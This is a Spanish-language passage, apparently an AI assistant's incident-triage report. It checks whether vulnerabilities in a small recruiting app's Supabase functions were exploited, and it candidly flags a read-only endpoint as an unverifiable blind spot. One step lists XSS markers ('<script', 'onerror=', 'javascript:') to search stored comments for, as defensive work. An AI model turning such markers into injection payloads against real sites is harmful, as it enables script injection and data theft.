| **H-01** `crear-reclutador` | Fila nueva en `usuarios` + cuenta en `auth.users` | **4 cuentas, todas explicables.** 1 admin (`huellalaboral.cl`), 3 reclutadores (`immerx.cl`, `gmail.com`, `yokono.cl`). Altas: 09-03, 20-03, 23-05, 26-06. Ninguna inesperada. **Sin evidencia de explotación** |
| **H-03** `validar-documentos` | Fila en `validaciones_documentos` | **2 filas, ambas del 2026-06-26 16:44:39**, separadas por 0,12 s: una sola llamada legítima validando certificado y finiquito a la vez. **Sin evidencia de explotación** |
| **H-06** `crear-solicitud` | Filas en `trabajadores` / `empleadores_solicitados` | 2 y 2, del 26-06 y el 24-07, coherentes entre sí. **Sin evidencia de abuso** |
| **H-07** XSS | Payload en `evaluaciones.comentarios` | No inspeccionado: exigiría leer texto libre, que es dato personal (D-5). **Comprobación pendiente, tuya** |

### Lo que no puedo descartar

**H-02 (`obtener-validacion`) es una operación de solo lectura. No escribe absolutamente nada.** Si alguien ha estado descargando certificados de cotizaciones y finiquitos, **no existe rastro en la base de datos**. La única fuente que lo registraría son los logs de edge functions, y son de 24 horas y hoy vuelven vacíos.

Con la información disponible desde aquí, **no es posible determinar si H-02 ha sido explotado**. Y no quiero que eso se lea como tranquilizador: es una zona ciega, no un resultado negativo.

**Lo que sí acota el riesgo:** el sistema tiene 2 trabajadores y 4 documentos. Aunque H-02 se hubiera explotado por completo, el universo afectado son 2 personas. La ventana de exposición es amplia —`obtener-validacion` lleva desplegada desde febrero— pero la superficie es mínima.

**Lo que puedes hacer y yo no:**
1. **Logs de Vercel**, que sí guardan histórico según el plan: buscar peticiones a `validar.html` desde IPs que no sean tuyas.
2. **Analytics de Supabase** en el dashboard, con retención mayor que la del MCP.
3. **Registros de Storage**: descargas de los buckets `certificados` y `finiquitos` fuera de tus sesiones de validación.
4. **Revisar `evaluaciones.comentarios`** en las 2 filas, buscando `<script`, `onerror=` o `javascript:` (H-07).

**Veredicto:** con lo verificable desde esta sesión, **no hay indicios de acceso externo**, y las tres vías que dejan rastro salen limpias. La cuarta no deja rastro y queda como zona ciega, con un universo máximo de 2 personas afectadas. Yo lo trataría como vulnerabilidad, no como incidente declarado — pero con la comprobación de los logs de Vercel pendiente antes de cerrarlo del todo.
